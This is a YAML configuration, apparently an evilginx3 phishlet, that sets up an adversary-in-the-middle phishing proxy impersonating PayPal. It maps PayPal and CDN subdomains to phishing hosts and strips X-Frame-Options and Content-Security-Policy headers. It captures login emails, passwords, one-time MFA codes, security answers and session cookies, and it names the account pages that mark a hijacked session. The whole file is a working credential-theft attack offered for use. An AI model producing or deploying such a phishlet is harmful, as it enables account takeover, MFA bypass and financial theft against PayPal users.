min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://www.paypal.com/'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'paypal.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 't', orig_sub: 't', domain: 'paypal.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'c', orig_sub: 'c', domain: 'paypal.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'history', orig_sub: 'history', domain: 'paypal.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'paypalobjects.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace PayPal domain URLs
  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: 'https://www\\.paypal\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.paypal.com', orig_sub: 'api', domain: 'paypal.com', search: 'https://api\\.paypal\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.paypal.com', orig_sub: 't', domain: 'paypal.com', search: 'https://t\\.paypal\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.paypal.com', orig_sub: 'c', domain: 'paypal.com', search: 'https://c\\.paypal\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'www.paypal.com', orig_sub: 'history', domain: 'paypal.com', search: 'https://history\\.paypal\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json']}
  
  # Replace PayPal CDN URLs
  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypalobjects.com', search: 'https://www\\.paypalobjects\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Remove security headers
  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.paypal.com', orig_sub: 't', domain: 'paypal.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.paypal.com', orig_sub: 't', domain: 'paypal.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary PayPal authentication cookies
  - domain: '.paypal.com'
    keys: ['cookie_check', 'LANG', 'nsid', 'login_email', 'ts_c', 'l7_az', 'enforce_policy', 'X-PP-SILOVER', 'fn_dt', 'ui_experience', 'SEGM']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.paypal.com'
    keys: ['x-pp-s', 'ts', 'tsrce', 'akavpau_ppsd', 'KHcl0EuY7AKSMgfvHl7m5PThkXY']
    type: 'cookie'
    optional: true
  
  # Device fingerprinting cookies
  - domain: '.paypal.com'
    keys: ['PYPF', 'x-cdn', 'HaC', 'sc_f']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'login_email'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'login_password'
    search: '(.*)'
    type: 'post'
  
  # Alternative credential fields
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  passwd:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # MFA/2FA codes
  otp:
    key: 'otpCode'
    search: '(.*)'
    type: 'post'
  
  security_answer:
    key: 'securityAnswer'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '/myaccount/home'
  - '/myaccount/summary'
  - '/mep/dashboard'
  - '/myaccount/transactions'
  - '/myaccount/settings'

login:
  domain: 'www.paypal.com'
  path: '/signin'

